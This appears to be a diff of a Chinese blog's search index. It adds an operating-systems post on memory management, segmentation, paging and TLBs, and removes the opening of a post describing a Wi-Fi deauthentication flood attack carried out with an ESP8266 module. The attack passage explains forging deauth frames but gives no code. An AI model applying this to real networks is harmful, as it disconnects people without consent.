@@ -1,6 +1,206 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>内存管理</title>
+    <url>/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h2 id="内存使用与分段"><a href="#内存使用与分段" class="headerlink" title="内存使用与分段"></a>内存使用与分段</h2><h3 id="从计算机如何工作开始讲起"><a href="#从计算机如何工作开始讲起" class="headerlink" title="从计算机如何工作开始讲起"></a>从计算机如何工作开始讲起</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/95.png" class="">
+
+<ul>
+<li>内存使用：将程序放入内存中，PC指向开始地址</li>
+</ul>
+<h3 id="首先让程序进入内存"><a href="#首先让程序进入内存" class="headerlink" title="首先让程序进入内存"></a>首先让程序进入内存</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/96.png" class="">
+
+<p>​    用磁盘将对应的机械代码读入内存，call 40时需要在地址总线上发送40，然后main函数的入口就放在40地址处。而物理内存40正好是_entry到_main的偏移地址，所以_entry就在地址0处。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/97.png" class="">
+
+<p>但如果有0地址处被占用了，或多个程序在内存中，就不能都放在0地址处。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/98.png" class="">
+
+<p>但一旦IP修改到一个空闲的地址，那么call 40就不再是_main的地址。</p>
+<h3 id="重定位：修改程序中的地址-相对地址-逻辑地址"><a href="#重定位：修改程序中的地址-相对地址-逻辑地址" class="headerlink" title="重定位：修改程序中的地址(相对地址/逻辑地址)"></a>重定位：修改程序中的地址(相对地址/逻辑地址)</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/99.png" class="">
+
+<p>什么时候完成重定位？</p>
+<ol>
+<li>编译时（编译时不知道执行时哪些地址是空闲的，在实际系统中何难实现。但例如嵌入式系统烧录后不再改变，就可以实现）</li>
+<li>载入时（在载入内存时重定位，执行前分配空闲的地址）</li>
+<li>运行时（支持进程换入和换出）</li>
+</ol>
+<h3 id="程序载入后还需要移动"><a href="#程序载入后还需要移动" class="headerlink" title="程序载入后还需要移动"></a>程序载入后还需要移动</h3><ul>
+<li>一个重要概念：交换（swap）<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/100.png" class=""></li>
+<li>如果一个进程阻塞了，那么需要将睡眠的进程换出，将就绪的进程换入。</li>
+<li>一旦进程在载入后移动，地址就又发生了该百年。</li>
+</ul>
+</li>
+</ul>
+<h3 id="重定位最合适的时机-运行时重定位"><a href="#重定位最合适的时机-运行时重定位" class="headerlink" title="重定位最合适的时机-运行时重定位"></a>重定位最合适的时机-运行时重定位</h3><ul>
+<li>在运行每条指令时才完成重定位<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/101.png" class=""></li>
+<li>base放在哪里？怎么找到？<ul>
+<li>在PCB中，一旦进程执行，执行指令翻译时，就从PCB中找基地址</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="引入分段：是将整个程序一起载入内存中吗？"><a href="#引入分段：是将整个程序一起载入内存中吗？" class="headerlink" title="引入分段：是将整个程序一起载入内存中吗？"></a>引入分段：是将整个程序一起载入内存中吗？</h3><ul>
+<li>程序员眼中的程序<ul>
+<li>由若干部分（段）组成，每个段有各自的特点、用途：代码段只读，代码段/数据段不会动态增长</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/102.png" class=""></li>
+</ul>
+</li>
+<li>符合用户观点：用户可独立考虑每个分段（分治）</li>
+<li>怎么具体定位具体指令（数据）：&lt;段号，段内偏移&gt;（&lt;cs:ip&gt;）</li>
+</ul>
+<h3 id="不是将整个程序，是将各个段分别放入内存"><a href="#不是将整个程序，是将各个段分别放入内存" class="headerlink" title="不是将整个程序，是将各个段分别放入内存"></a>不是将整个程序，是将各个段分别放入内存</h3><p>由高地址到低地址分别是：</p>
+<ol>
+<li><p><strong>栈</strong>：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。 在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</p>
+</li>
+<li><p><strong>堆</strong>：用来存储程序运行时分配的变量。</p>
+<p>堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free()等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）  堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</p>
+</li>
+<li><p><strong>BSS段</strong>：用来保存全局的和静态的未初始化变量</p>
+</li>
+<li><p><strong>data段</strong>：用来存放保存全局的和静态的已初始化变量</p>
+</li>
+<li><p><strong>text段</strong>：存放着程序的机器码和只读数据，可执行指令就是从这里取得的。</p>
+</li>
+</ol>
+<p>需要一张表，来记录每个段的<strong>基址、长度、读写权限</strong>等，即<strong>进程段表</strong>（LDT）</p>
+<p>而操作系统的那张段表就是（GDT）</p>
+<h3 id="真正的故事：GDT-LDT"><a href="#真正的故事：GDT-LDT" class="headerlink" title="真正的故事：GDT+LDT"></a>真正的故事：GDT+LDT</h3><p>GDT表项：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/103.png" class="">
+
+<p>通过GDT表分开各个进程的基址，通过LDT表来分开进程中各个段的基址</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/104.png" class="">
+
+<h2 id="内存分区与分页"><a href="#内存分区与分页" class="headerlink" title="内存分区与分页"></a>内存分区与分页</h2><p>编译将程序分成多个段以后，需要将内存分成多个区域。将内存分割后，就能将程序的各个段载入到相应的内存分区中。</p>
+<h3 id="固定分区和可变分区"><a href="#固定分区和可变分区" class="headerlink" title="固定分区和可变分区"></a>固定分区和可变分区</h3><ul>
+<li>将内存等分成k个分区<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/105.png" class=""></li>
+<li>但程序有大有小。段也有大有小，需求不一样，这样不太合适</li>
+</ul>
+</li>
+<li>按需要分配内存分区<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/106.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h3 id="可变分区的管理过程-核心数据结构"><a href="#可变分区的管理过程-核心数据结构" class="headerlink" title="可变分区的管理过程-核心数据结构"></a>可变分区的管理过程-核心数据结构</h3><p>当前内存图像：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/107.png" class="">
+
+<p>对应的表：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/108.png" class="">
+
+<ul>
+<li>当段内存请求：reqSize=100K<ul>
+<li>起始地址+100K</li>
+<li>长度-100K</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/109.png" class=""></li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/110.png" class=""></li>
+</ul>
+</li>
+<li>段2不再需要，释放内存<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/111.png" class=""></li>
+</ul>
+</li>
+</ul>
+<h3 id="可变分区的管理-再次申请"><a href="#可变分区的管理-再次申请" class="headerlink" title="可变分区的管理-再次申请"></a>可变分区的管理-再次申请</h3><ul>
+<li>又一个段提出内存申请：reqSize=40K。空闲分区表中有两个分区，选择哪一个需要合适的算法（长度分别为50K和150K）<ul>
+<li>首<strong>先</strong>适配：选表中第一个空闲分区<ul>
+<li>速度最快</li>
+</ul>
+</li>
+<li>最<strong>佳</strong>适配：选择一个分区长度最接近内存申请长度的区域<ul>
+<li>空闲分区会被分割的越来约小</li>
+</ul>
+</li>
+<li>最<strong>差</strong>适配：选择一个分区长度最不接近内存申请长度的区域（最大的区域）<ul>
+<li>空闲分区长度会很均匀</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="引入分页：解决内存分区导致的内存效率问题"><a href="#引入分页：解决内存分区导致的内存效率问题" class="headerlink" title="引入分页：解决内存分区导致的内存效率问题"></a>引入分页：解决内存分区导致的内存效率问题</h3><ul>
+<li>发起请求reqSize=160K怎么办？<ul>
+<li>总空闲空间&gt;160，但没有一个空闲分区&gt;160，怎么办？<ul>
+<li>这就是内存碎片的问题</li>
+<li>将空闲分区合并，则需要移动：<strong>内存紧缩</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>但是内存紧缩会有大量的性能损失</li>
+</ul>
+<h3 id="从连续到离散"><a href="#从连续到离散" class="headerlink" title="从连续到离散"></a>从连续到离散</h3><p>将内存分成页，针对每个段内存请求，系统一页一页的分配给这个段。</p>
+<ul>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/112.png" class=""></li>
+<li>段内存请求来到后，算一下需要几页的内存，然后将内存一页一页地分配给这个段。</li>
+<li>这样一来有页内部碎片，但没有页外部碎片</li>
+</ul>
+<h3 id="页已经载入了内存，那么"><a href="#页已经载入了内存，那么" class="headerlink" title="页已经载入了内存，那么"></a>页已经载入了内存，那么</h3><p>程序调用内存，需要通过偏移地址，找到对应的页号（页框），而页内的地址需要重定位。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/113.png" class="">
+
+<p>每个进程都有自己的页表：</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/114.png" class="">
+
+<p>若有一指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [0x2240],	%eax</span><br></pre></td></tr></table></figure>
+
+<p>则需要将0x2240除以4K（假设的页大小），然后得到页号（商）和页内偏移地址（余数）</p>
+<p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
+<p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
+<p>得到物理地址：0x3240</p>
+<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2><h3 id="页表会很大，页表放置就成了问题"><a href="#页表会很大，页表放置就成了问题" class="headerlink" title="页表会很大，页表放置就成了问题"></a>页表会很大，页表放置就成了问题</h3><p>为了提高空间利用率，页的大小就应该小，但页的表项就会多。</p>
+<ul>
+<li>页大小一般是4k，而地址是32位的，所以由2的20次方个页表现</li>
+<li>这么多页表项，需要4M的内存；当系统中并发10个进程，就需要40M内存</li>
+<li>进程越多，存储页表项需要内存越多，这也是一种内存的浪费</li>
+</ul>
+<p>实际上大部分逻辑地址根本不会用到</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/115.png" class="">
+
+<h3 id="第一种尝试，只存放用到的页"><a href="#第一种尝试，只存放用到的页" class="headerlink" title="第一种尝试，只存放用到的页"></a>第一种尝试，只存放用到的页</h3><ul>
+<li>很自然的想法：只有用到的逻辑页才有页表项<ul>
+<li>但页表中的页号不连续，就需要比较、查找 ，浪费时间</li>
+<li>如果页号连续，一次访问就能找到相应的页框号</li>
+</ul>
+</li>
+<li>页号连续，浪费内存。页号不连续，浪费查找时间</li>
+</ul>
+<p>既要连续又要让页表占用内存少，怎么办？</p>
+<h3 id="多级页表，即页目录表-页表"><a href="#多级页表，即页目录表-页表" class="headerlink" title="多级页表，即页目录表 + 页表"></a>多级页表，即页目录表 + 页表</h3><p>​        多个页号放进一个页目录中，这样生成的页表只记录该页目录下的页，就缩小了页表的长度。而这样的一个页表又是连续的，就不需要比较查找。</p>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/116.png" class="">
+
+<p>​        offset指向了一个4k大小的页。而一个页目录下有1024个页。共有1024个页目录。所以一个32位逻辑地址指向了一个4G的空间。</p>
+<h3 id="多级页表提高了空间效率，但在时间？"><a href="#多级页表提高了空间效率，但在时间？" class="headerlink" title="多级页表提高了空间效率，但在时间？"></a>多级页表提高了空间效率，但在时间？</h3><ul>
+<li>多级页表怎加了访问内存的次数<ul>
+<li>每增加一级页表，内存的访问次数就要怎加一次</li>
+<li>访问次数增多，时间效率不高</li>
+</ul>
+</li>
+<li>快表：TLB是一组相联快速存储，是寄存器<ul>
+<li>将最常用的页号存到寄存器中，调用十分迅速</li>
+<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/117.png" class="">
+<ul>
+<li>如果命中，可以直接硬件上将逻辑地址转换成物理地址</li>
+<li>如果不命中，就去多级页表中查，然后将这次的存储地址放到快表中（空间局部性好的程序往往查找速度越快）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>多级页表保证了减少了页表中的页表项，减少了内存损耗。通过快表保证了多次使用的内存，查找速度很快。这样以来，空间时间上都有较高的效率。</li>
+</ul>
+<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/118.png" class="">
+
+<p>​        通过有效访问时间的计算，可以判断一个快表的好坏（后面会有换入和换出算法来更新快表，这种算法越好，快表命中率越高）。而快表越大，命中率也越高，但TLB也越贵。</p>
+]]></content>
+      <categories>
+        <category>操作系统</category>
+      </categories>
+  </entry>
+  <entry>
     <title>基础知识</title>
     <url>/2021/07/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h2 id="什么是操作系统？"><a href="#什么是操作系统？" class="headerlink" title="什么是操作系统？"></a>什么是操作系统？</h2><p>只有计算机硬件的东西叫裸机。</p>
@@ -328,258 +528,6 @@
 ]]></content>
       <categories>
         <category>操作系统</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>内存管理</title>
-    <url>/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h2 id="内存使用与分段"><a href="#内存使用与分段" class="headerlink" title="内存使用与分段"></a>内存使用与分段</h2><h3 id="从计算机如何工作开始讲起"><a href="#从计算机如何工作开始讲起" class="headerlink" title="从计算机如何工作开始讲起"></a>从计算机如何工作开始讲起</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/95.png" class="">
-
-<ul>
-<li>内存使用：将程序放入内存中，PC指向开始地址</li>
-</ul>
-<h3 id="首先让程序进入内存"><a href="#首先让程序进入内存" class="headerlink" title="首先让程序进入内存"></a>首先让程序进入内存</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/96.png" class="">
-
-<p>​    用磁盘将对应的机械代码读入内存，call 40时需要在地址总线上发送40，然后main函数的入口就放在40地址处。而物理内存40正好是_entry到_main的偏移地址，所以_entry就在地址0处。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/97.png" class="">
-
-<p>但如果有0地址处被占用了，或多个程序在内存中，就不能都放在0地址处。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/98.png" class="">
-
-<p>但一旦IP修改到一个空闲的地址，那么call 40就不再是_main的地址。</p>
-<h3 id="重定位：修改程序中的地址-相对地址-逻辑地址"><a href="#重定位：修改程序中的地址-相对地址-逻辑地址" class="headerlink" title="重定位：修改程序中的地址(相对地址/逻辑地址)"></a>重定位：修改程序中的地址(相对地址/逻辑地址)</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/99.png" class="">
-
-<p>什么时候完成重定位？</p>
-<ol>
-<li>编译时（编译时不知道执行时哪些地址是空闲的，在实际系统中何难实现。但例如嵌入式系统烧录后不再改变，就可以实现）</li>
-<li>载入时（在载入内存时重定位，执行前分配空闲的地址）</li>
-<li>运行时（支持进程换入和换出）</li>
-</ol>
-<h3 id="程序载入后还需要移动"><a href="#程序载入后还需要移动" class="headerlink" title="程序载入后还需要移动"></a>程序载入后还需要移动</h3><ul>
-<li>一个重要概念：交换（swap）<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/100.png" class=""></li>
-<li>如果一个进程阻塞了，那么需要将睡眠的进程换出，将就绪的进程换入。</li>
-<li>一旦进程在载入后移动，地址就又发生了该百年。</li>
-</ul>
-</li>
-</ul>
-<h3 id="重定位最合适的时机-运行时重定位"><a href="#重定位最合适的时机-运行时重定位" class="headerlink" title="重定位最合适的时机-运行时重定位"></a>重定位最合适的时机-运行时重定位</h3><ul>
-<li>在运行每条指令时才完成重定位<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/101.png" class=""></li>
-<li>base放在哪里？怎么找到？<ul>
-<li>在PCB中，一旦进程执行，执行指令翻译时，就从PCB中找基地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="引入分段：是将整个程序一起载入内存中吗？"><a href="#引入分段：是将整个程序一起载入内存中吗？" class="headerlink" title="引入分段：是将整个程序一起载入内存中吗？"></a>引入分段：是将整个程序一起载入内存中吗？</h3><ul>
-<li>程序员眼中的程序<ul>
-<li>由若干部分（段）组成，每个段有各自的特点、用途：代码段只读，代码段/数据段不会动态增长</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/102.png" class=""></li>
-</ul>
-</li>
-<li>符合用户观点：用户可独立考虑每个分段（分治）</li>
-<li>怎么具体定位具体指令（数据）：&lt;段号，段内偏移&gt;（&lt;cs:ip&gt;）</li>
-</ul>
-<h3 id="不是将整个程序，是将各个段分别放入内存"><a href="#不是将整个程序，是将各个段分别放入内存" class="headerlink" title="不是将整个程序，是将各个段分别放入内存"></a>不是将整个程序，是将各个段分别放入内存</h3><p>由高地址到低地址分别是：</p>
-<ol>
-<li><p><strong>栈</strong>：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。 在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</p>
-</li>
-<li><p><strong>堆</strong>：用来存储程序运行时分配的变量。</p>
-<p>堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free()等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）  堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</p>
-</li>
-<li><p><strong>BSS段</strong>：用来保存全局的和静态的未初始化变量</p>
-</li>
-<li><p><strong>data段</strong>：用来存放保存全局的和静态的已初始化变量</p>
-</li>
-<li><p><strong>text段</strong>：存放着程序的机器码和只读数据，可执行指令就是从这里取得的。</p>
-</li>
-</ol>
-<p>需要一张表，来记录每个段的<strong>基址、长度、读写权限</strong>等，即<strong>进程段表</strong>（LDT）</p>
-<p>而操作系统的那张段表就是（GDT）</p>
-<h3 id="真正的故事：GDT-LDT"><a href="#真正的故事：GDT-LDT" class="headerlink" title="真正的故事：GDT+LDT"></a>真正的故事：GDT+LDT</h3><p>GDT表项：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/103.png" class="">
-
-<p>通过GDT表分开各个进程的基址，通过LDT表来分开进程中各个段的基址</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/104.png" class="">
-
-<h2 id="内存分区与分页"><a href="#内存分区与分页" class="headerlink" title="内存分区与分页"></a>内存分区与分页</h2><p>编译将程序分成多个段以后，需要将内存分成多个区域。将内存分割后，就能将程序的各个段载入到相应的内存分区中。</p>
-<h3 id="固定分区和可变分区"><a href="#固定分区和可变分区" class="headerlink" title="固定分区和可变分区"></a>固定分区和可变分区</h3><ul>
-<li>将内存等分成k个分区<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/105.png" class=""></li>
-<li>但程序有大有小。段也有大有小，需求不一样，这样不太合适</li>
-</ul>
-</li>
-<li>按需要分配内存分区<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/106.png" class=""></li>
-</ul>
-</li>
-</ul>
-<h3 id="可变分区的管理过程-核心数据结构"><a href="#可变分区的管理过程-核心数据结构" class="headerlink" title="可变分区的管理过程-核心数据结构"></a>可变分区的管理过程-核心数据结构</h3><p>当前内存图像：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/107.png" class="">
-
-<p>对应的表：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/108.png" class="">
-
-<ul>
-<li>当段内存请求：reqSize=100K<ul>
-<li>起始地址+100K</li>
-<li>长度-100K</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/109.png" class=""></li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/110.png" class=""></li>
-</ul>
-</li>
-<li>段2不再需要，释放内存<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/111.png" class=""></li>
-</ul>
-</li>
-</ul>
-<h3 id="可变分区的管理-再次申请"><a href="#可变分区的管理-再次申请" class="headerlink" title="可变分区的管理-再次申请"></a>可变分区的管理-再次申请</h3><ul>
-<li>又一个段提出内存申请：reqSize=40K。空闲分区表中有两个分区，选择哪一个需要合适的算法（长度分别为50K和150K）<ul>
-<li>首<strong>先</strong>适配：选表中第一个空闲分区<ul>
-<li>速度最快</li>
-</ul>
-</li>
-<li>最<strong>佳</strong>适配：选择一个分区长度最接近内存申请长度的区域<ul>
-<li>空闲分区会被分割的越来约小</li>
-</ul>
-</li>
-<li>最<strong>差</strong>适配：选择一个分区长度最不接近内存申请长度的区域（最大的区域）<ul>
-<li>空闲分区长度会很均匀</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="引入分页：解决内存分区导致的内存效率问题"><a href="#引入分页：解决内存分区导致的内存效率问题" class="headerlink" title="引入分页：解决内存分区导致的内存效率问题"></a>引入分页：解决内存分区导致的内存效率问题</h3><ul>
-<li>发起请求reqSize=160K怎么办？<ul>
-<li>总空闲空间&gt;160，但没有一个空闲分区&gt;160，怎么办？<ul>
-<li>这就是内存碎片的问题</li>
-<li>将空闲分区合并，则需要移动：<strong>内存紧缩</strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>但是内存紧缩会有大量的性能损失</li>
-</ul>
-<h3 id="从连续到离散"><a href="#从连续到离散" class="headerlink" title="从连续到离散"></a>从连续到离散</h3><p>将内存分成页，针对每个段内存请求，系统一页一页的分配给这个段。</p>
-<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/112.png" class=""></li>
-<li>段内存请求来到后，算一下需要几页的内存，然后将内存一页一页地分配给这个段。</li>
-<li>这样一来有页内部碎片，但没有页外部碎片</li>
-</ul>
-<h3 id="页已经载入了内存，那么"><a href="#页已经载入了内存，那么" class="headerlink" title="页已经载入了内存，那么"></a>页已经载入了内存，那么</h3><p>程序调用内存，需要通过偏移地址，找到对应的页号（页框），而页内的地址需要重定位。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/113.png" class="">
-
-<p>每个进程都有自己的页表：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/114.png" class="">
-
-<p>若有一指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [0x2240],	%eax</span><br></pre></td></tr></table></figure>
-
-<p>则需要将0x2240除以4K（假设的页大小），然后得到页号（商）和页内偏移地址（余数）</p>
-<p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
-<p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
-<p>得到物理地址：0x3240</p>
-<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2><h3 id="页表会很大，页表放置就成了问题"><a href="#页表会很大，页表放置就成了问题" class="headerlink" title="页表会很大，页表放置就成了问题"></a>页表会很大，页表放置就成了问题</h3><p>为了提高空间利用率，页的大小就应该小，但页的表项就会多。</p>
-<ul>
-<li>页大小一般是4k，而地址是32位的，所以由2的20次方个页表现</li>
-<li>这么多页表项，需要4M的内存；当系统中并发10个进程，就需要40M内存</li>
-<li>进程越多，存储页表项需要内存越多，这也是一种内存的浪费</li>
-</ul>
-<p>实际上大部分逻辑地址根本不会用到</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/115.png" class="">
-
-<h3 id="第一种尝试，只存放用到的页"><a href="#第一种尝试，只存放用到的页" class="headerlink" title="第一种尝试，只存放用到的页"></a>第一种尝试，只存放用到的页</h3><ul>
-<li>很自然的想法：只有用到的逻辑页才有页表项<ul>
-<li>但页表中的页号不连续，就需要比较、查找 ，浪费时间</li>
-<li>如果页号连续，一次访问就能找到相应的页框号</li>
-</ul>
-</li>
-<li>页号连续，浪费内存。页号不连续，浪费查找时间</li>
-</ul>
-<p>既要连续又要让页表占用内存少，怎么办？</p>
-<h3 id="多级页表，即页目录表-页表"><a href="#多级页表，即页目录表-页表" class="headerlink" title="多级页表，即页目录表 + 页表"></a>多级页表，即页目录表 + 页表</h3><p>​        多个页号放进一个页目录中，这样生成的页表只记录该页目录下的页，就缩小了页表的长度。而这样的一个页表又是连续的，就不需要比较查找。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/116.png" class="">
-
-<p>​        offset指向了一个4k大小的页。而一个页目录下有1024个页。共有1024个页目录。所以一个32位逻辑地址指向了一个4G的空间。</p>
-<h3 id="多级页表提高了空间效率，但在时间？"><a href="#多级页表提高了空间效率，但在时间？" class="headerlink" title="多级页表提高了空间效率，但在时间？"></a>多级页表提高了空间效率，但在时间？</h3><ul>
-<li>多级页表怎加了访问内存的次数<ul>
-<li>每增加一级页表，内存的访问次数就要怎加一次</li>
-<li>访问次数增多，时间效率不高</li>
-</ul>
-</li>
-<li>快表：TLB是一组相联快速存储，是寄存器<ul>
-<li>将最常用的页号存到寄存器中，调用十分迅速</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/117.png" class="">
-<ul>
-<li>如果命中，可以直接硬件上将逻辑地址转换成物理地址</li>
-<li>如果不命中，就去多级页表中查，然后将这次的存储地址放到快表中（空间局部性好的程序往往查找速度越快）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>多级页表保证了减少了页表中的页表项，减少了内存损耗。通过快表保证了多次使用的内存，查找速度很快。这样以来，空间时间上都有较高的效率。</li>
-</ul>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/118.png" class="">
-
-<p>​        通过有效访问时间的计算，可以判断一个快表的好坏（后面会有换入和换出算法来更新快表，这种算法越好，快表命中率越高）。而快表越大，命中率也越高，但TLB也越贵。</p>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>无线DOS之取消验证洪水攻击</title>
-    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
-
-<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
-<p>简单配置一下</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
-
-<p>烧录</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
-
-<p>这时，esp8266会建立一个WIFI，</p>
